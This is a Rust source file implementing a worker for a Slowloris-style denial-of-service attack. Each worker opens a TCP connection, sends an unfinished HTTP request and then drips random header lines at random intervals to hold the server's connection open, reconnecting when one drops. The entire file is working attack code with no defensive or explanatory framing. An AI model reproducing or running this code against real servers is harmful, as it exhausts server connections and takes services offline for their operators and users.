use rand::rngs::SmallRng;
use rand::{FromEntropy, Rng};
use std::io::{Error, Write};
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

pub struct Worker {
    id: u16,
    conn: String,
    sleep_bounds: (u8, u8),
    verbose: i32,
    rng: SmallRng,
    stream: TcpStream,
}

impl Worker {
    pub fn new(id: u16, conn: String, sleep_bounds: (u8, u8), verbose: i32) -> Result<Worker, Error> {
        let mut stream = TcpStream::connect(&conn)?;
        let mut rng = SmallRng::from_entropy();
        stream.write_all(
            format!(
                "GET /?{} HTTP/1.1\r\nUser-Agent: slowdorust\r\nConnection: keep-alive\r\n",
                rng.gen::<u64>()
            )
            .as_bytes(),
        )?;

        Ok(Worker {
            id,
            sleep_bounds,
            conn,
            verbose,
            rng,
            stream,
        })
    }

    pub fn start(&mut self) {
        loop {
            thread::sleep(Duration::from_secs(
                self.rng.gen_range(self.sleep_bounds.0, self.sleep_bounds.1) as u64
            ));
            match &self.stream.write_all(format!("X-a: {}\r\n", &self.rng.gen::<u64>()).as_bytes()) {
                Ok(_) if (self.verbose > 0) => {
                    println!("[slowlorust_{:03}] Data send success.", self.id)
                }
                Ok(_) => {}
                Err(_) => {
                    if let Ok(mut worker) = Worker::new(self.id, self.conn.clone(), self.sleep_bounds, self.verbose) {
                        if self.verbose > 0 {
                            println!("[slowlorust_{:03}] Recreating.", self.id);
                        }
                        worker.start();
                    }
                }
            }
        }
    }
}
